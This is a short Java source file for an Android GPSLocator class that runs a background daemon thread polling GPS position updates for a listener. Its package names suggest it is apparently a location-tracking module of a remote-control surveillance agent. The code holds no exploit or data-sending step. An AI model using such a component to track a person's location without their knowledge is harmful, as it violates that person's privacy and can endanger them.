package com.ht.RCSAndroidGUI.agent.position;

import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.agent.PositionAgent;

import android.content.Context;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;
import android.util.Log;

public class GPSLocator extends Thread {
	private static final String TAG = "GPSLocator";
	private LocationManager lm;
	private LocationListener listener;
	private int period;
	
	private GPSLocator() {
		setDaemon(true);
		setName("LocationThread");
	}

	public GPSLocator(LocationListener listener, int period) {
		this();
		this.listener = listener;
		this.period = period;
		lm = (LocationManager)Status.getAppContext().getSystemService(Context.LOCATION_SERVICE); 
	}

	Looper myLooper;
	public void run() {
		Looper.prepare();
		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, period, 0L,
				listener, Looper.getMainLooper());
		myLooper = Looper.myLooper();
		Looper.loop();
		Log.d(TAG,"exiting");
	}
	
	public void halt(){
		lm.removeUpdates(listener);
		if(myLooper != null){
			myLooper.quit();
		}
		lm = null;
	}
}